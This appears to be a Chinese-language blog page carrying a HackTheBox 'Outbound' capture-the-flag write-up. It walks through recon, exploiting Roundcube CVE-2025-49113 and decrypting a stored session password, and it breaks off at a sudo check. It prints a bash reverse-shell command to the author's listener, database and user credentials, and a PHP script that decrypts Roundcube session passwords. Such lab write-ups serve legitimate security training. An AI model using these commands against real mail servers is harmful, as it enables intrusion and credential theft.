<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/rO8NqlxOMnvvJBFiroi4I/_buildManifest.js" defer=""></script><script src="/_next/static/rO8NqlxOMnvvJBFiroi4I/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Outbound","contentHtml":"\u003ch1\u003eSeason8 - Outbound\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/672\"\u003ehttps://app.hackthebox.com/machines/672\u003c/a\u003e | \u003ccode\u003eLinux\u003c/code\u003e | \u003ccode\u003eEasy\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e**Machine Information：**As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Outbound nmap -sT -min-rate 5000 -p- 10.10.11.77 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 11:50 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.77\nHost is up (0.099s latency).\nNot shown: 65411 filtered tcp ports (no-response), 122 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 39.56 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Outbound nmap -sT -A -p 22,80 10.10.11.77                                                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 11:52 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.77\nHost is up (0.18s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:\u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e (ECDSA)\n|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:\u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e:38:b0 (ED25519)\n80/tcp open  http    nginx 1.24.0 (Ubuntu)\n|_http-server-header: nginx/1.24.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://mail.outbound.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   240.46 ms 10.10.16.1\n2   96.68 ms  10.10.11.77\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 43.68 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e 默认域名是 \u003ccode\u003email.outbound.htb\u003c/code\u003e ，搭建着 \u003ccode\u003eRoundcube Webmail 1.6.10\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e可以以提供的账户进行登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cstrong\u003eCVE-2025-49113\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003e在关于中能知道版本是\u003ccode\u003e1.6.10\u003c/code\u003e ，能找到一个漏洞 \u003cstrong\u003e\u003ccode\u003eCVE-2025-49113\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://support.plesk.com/hc/en-us/articles/32537488344343-CVE-2025-49113-Vulnerability-in-Roundcube-on-Plesk-servers\"\u003ehttps://support.plesk.com/hc/en-us/articles/32537488344343-CVE-2025-49113-Vulnerability-in-Roundcube-on-Plesk-servers\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eEXP链接：\u003ca href=\"https://github.com/fearsoff-org/CVE-2025-49113\"\u003ehttps://github.com/fearsoff-org/CVE-2025-49113\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们直接反弹\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ephp CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 \u003cspan class=\"hljs-string\"\u003e'/bin/bash -c \"bash -i \u003e\u0026#x26; /dev/tcp/10.10.xxxxx/1234 0\u003e\u0026#x26;1\"'\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eIn www-data\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e看一下家目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@mail:/var/www/html/roundcube/public_html$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e /home\njacob  mel  tyler\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看监听的端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@mail:/var/www/html/roundcube/public_html/roundcube$ ss -tulpn\nNetid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                                               \ntcp   LISTEN 0      100        127.0.0.1:25        0.0.0.0:*                                                         \ntcp   LISTEN 0      100          0.0.0.0:143       0.0.0.0:*                                                         \ntcp   LISTEN 0      100          0.0.0.0:110       0.0.0.0:*                                                         \ntcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e:((\"nginx\",pid=\u003cspan class=\"hljs-number\"\u003e204\u003c/span\u003e,fd=\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e),(\"nginx\",pid=\u003cspan class=\"hljs-number\"\u003e202\u003c/span\u003e,fd=\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e))\ntcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*                                                         \ntcp   LISTEN 0      100          0.0.0.0:993       0.0.0.0:*                                                         \ntcp   LISTEN 0      100          0.0.0.0:995       0.0.0.0:*                                                         \ntcp   LISTEN 0      100            [::1]:25           [::]:*                                                         \ntcp   LISTEN 0      100             [::]:143          [::]:*                                                         \ntcp   LISTEN 0      100             [::]:110          [::]:*                                                         \ntcp   LISTEN 0      100             [::]:993          [::]:*                                                         \ntcp   LISTEN 0      100             [::]:995          [::]:*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有在运行\u003ccode\u003emysql\u003c/code\u003e，我们找一下配置文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e找到账号密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$config\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'db_dsnw'\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'mysql://roundcube:RCDBPass2025@localhost/roundcube'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e用户表，但是貌似没什么用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [roundcube]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e;\n+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+----------------------------------------------------+\n| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                        |\n+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+----------------------------------------------------+\n|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-07-13 05:06:54 | 2025-07-13 05:26:40 |                    3 | en_US    | a:1:{s:11:\u003cspan class=\"hljs-string\"\u003e\"client_hash\"\u003c/span\u003e;s:16:\u003cspan class=\"hljs-string\"\u003e\"newrandomhash1234\"\u003c/span\u003e;} |\n|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:\u003cspan class=\"hljs-string\"\u003e\"client_hash\"\u003c/span\u003e;s:16:\u003cspan class=\"hljs-string\"\u003e\"GCrPGMkZvbsnc3xv\"\u003c/span\u003e;}  |\n|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-07-13 05:32:03 | 2025-06-11 07:51:22 |                    1 | en_US    | a:1:{s:11:\u003cspan class=\"hljs-string\"\u003e\"client_hash\"\u003c/span\u003e;s:16:\u003cspan class=\"hljs-string\"\u003e\"Y2Rz3HTwxwLJHevI\"\u003c/span\u003e;}  |\n|       4 | hacker   | localhost | 1000-01-01 00:00:00 | NULL                | 2025-07-13 05:31:53 |                    1 | NULL     | a:1:{s:11:\u003cspan class=\"hljs-string\"\u003e\"client_hash\"\u003c/span\u003e;s:16:\u003cspan class=\"hljs-string\"\u003e\"hackedhash123456\"\u003c/span\u003e;}  |\n+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+----------------------------------------------------+\n4 rows \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.000 se\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e解密 session\u003c/h3\u003e\n\u003cp\u003e从网上一篇文章中：\u003ca href=\"https://www.roundcubeforum.net/index.php?topic=23399.0\"\u003ehttps://www.roundcubeforum.net/index.php?topic=23399.0\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e可以知道，可以从\u003ccode\u003esession-vars\u003c/code\u003e中解密出密码\u003c/p\u003e\n\u003cp\u003e我们再看 \u003ccode\u003esession\u003c/code\u003e表\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ebase64\u003c/code\u003e解码：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里找了几个都是\u003ccode\u003etyler\u003c/code\u003e 用户，对我们没用，因为我们有了\u003ccode\u003etyler\u003c/code\u003e用户的凭据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中有个\u003ccode\u003ejacob\u003c/code\u003e 用户的，我们应该是要破解该密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e从 \u003ccode\u003econfig.inc.php\u003c/code\u003e 中拿到\u003ccode\u003edes_key\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// This key is used to encrypt the \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e imap password \u003cspan class=\"hljs-built_in\"\u003ewhich\u003c/span\u003e is stored\n// \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the session record. For the default cipher method it must be\n// exactly 24 characters long.\n// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS\n\u003cspan class=\"hljs-variable\"\u003e$config\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'des_key'\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'rcmail-!24ByteDESkey*Str'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接丢给\u003ccode\u003eGemini\u003c/code\u003e生成脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php\n\n// 你的输入\n\u003cspan class=\"hljs-variable\"\u003e$encrypted_base64\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$key\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'rcmail-!24ByteDESkey*Str'\u003c/span\u003e;\n\n// 1. Base64 解码\n\u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e = base64_decode(\u003cspan class=\"hljs-variable\"\u003e$encrypted_base64\u003c/span\u003e);\n\n// 2. 分离 IV 和密文\n// 获取 3DES-CBC 模式的 IV 长度 (结果是 8)\n\u003cspan class=\"hljs-variable\"\u003e$iv_size\u003c/span\u003e = openssl_cipher_iv_length(\u003cspan class=\"hljs-string\"\u003e'des-ede3-cbc'\u003c/span\u003e);\n\u003cspan class=\"hljs-variable\"\u003e$iv\u003c/span\u003e = substr(\u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e, 0, \u003cspan class=\"hljs-variable\"\u003e$iv_size\u003c/span\u003e);\n\u003cspan class=\"hljs-variable\"\u003e$ciphertext\u003c/span\u003e = substr(\u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$iv_size\u003c/span\u003e);\n\n// 3. 使用 OpenSSL 进行解密\n// Roundcube 使用零填充，所以要加上 OPENSSL_ZERO_PADDING 标志\n\u003cspan class=\"hljs-variable\"\u003e$decrypted\u003c/span\u003e = openssl_decrypt(\n    \u003cspan class=\"hljs-variable\"\u003e$ciphertext\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'des-ede3-cbc'\u003c/span\u003e, // 算法：3DES \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e CBC mode\n    \u003cspan class=\"hljs-variable\"\u003e$key\u003c/span\u003e,\n    OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, // 选项：原始数据 + 零填充\n    \u003cspan class=\"hljs-variable\"\u003e$iv\u003c/span\u003e\n);\n\n// 4. 移除末尾的空字节填充\n\u003cspan class=\"hljs-variable\"\u003e$password\u003c/span\u003e = rtrim(\u003cspan class=\"hljs-variable\"\u003e$decrypted\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"\\0\"\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"解密后的密码是: \"\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$password\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e;\n\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码，但是无法使用\u003ccode\u003eSSH\u003c/code\u003e进行登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Outbound php decrypt.php\n解密后的密码是: 595mO8DmwGeD\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是可以通过 \u003ccode\u003esu\u003c/code\u003e 切换过去\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eIn Jacob\u003c/h2\u003e\n\u003ch3\u003e权限提升\u003c/h3\u003e\n\u003cp\u003e家目录有\u003ccode\u003email\u003c/code\u003e文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejacob@mail:~/mail/INBOX$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e jacob \nFrom tyler@outbound.htb  Sat Jun 07 14:00:58 2025\nReturn-Path: \u0026#x3C;tyler@outbound.htb\u003e\nX-Original-To: jacob                     \nDelivered-To: jacob@outbound.htb\nReceived: by outbound.htb (Postfix, from userid 1000)\n        \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)\nTo: jacob@outbound.htb\nSubject: Important Update\nMIME-Version: 1.0\nContent-Type: text/plain; charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e                                                       \nContent-Transfer-Encoding: 8bit\nMessage-Id: \u0026#x3C;20250607140058.B32C410248D@outbound.htb\u003e\nDate: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)                                                     \nFrom: tyler@outbound.htb \nX-IMAPbase: 1749304753 0000000002                                                               \nX-UID: 1\nStatus: \nX-Keywords:                                                                        \nContent-Length: 233\n\nDue to the recent change of policies your password has been changed.\nPlease use the following credentials to \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e into your account: gY4Wr3a1evp4\n                                                                                                \nRemember to change your password when you next \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e into your account.    \n                                                \nThanks!                                         \n                                                \nTyler                      \n                                                \nFrom mel@outbound.htb  Sun Jun 08 12:09:45 2025\nReturn-Path: \u0026#x3C;mel@outbound.htb\u003e \nX-Original-To: jacob       \nDelivered-To: jacob@outbound.htb\nReceived: by outbound.htb (Postfix, from userid 1002)                                           \n        \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)                                      \nTo: jacob@outbound.htb             \nSubject: Unexpected Resource Consumption                                                        \nMIME-Version: 1.0                \nContent-Type: text/plain; charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\nContent-Transfer-Encoding: 8bit \nMessage-Id: \u0026#x3C;20250608120945.1487E22C@outbound.htb\u003e   \nDate: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)                                                     \nFrom: mel@outbound.htb\nX-UID: 2                 \nStatus:          \nX-Keywords:                                                                                     \nContent-Length: 261            \n                                                                                                \nWe have been experiencing high resource consumption on our main server.                         \nFor now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.\nPlease inform us immediately \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e you notice any irregularities.                                  \n                                                \nThanks! \n                                                                                                \nMel                \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e从上面的邮件得知，新密码：\u003ccode\u003egY4Wr3a1evp4\u003c/code\u003e ，然后服务器开启了资源监控功能，并授予您检查日志的权限。\u003c/p\u003e\n\u003cp\u003e我们通过新密码能使用\u003ccode\u003essh\u003c/code\u003e登录上去\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过 \u003ccode\u003essh\u003c/code\u003e 进来的可以读取\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejacob@outbound:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\nc82c459d58754712xxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejacob@outbound:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan 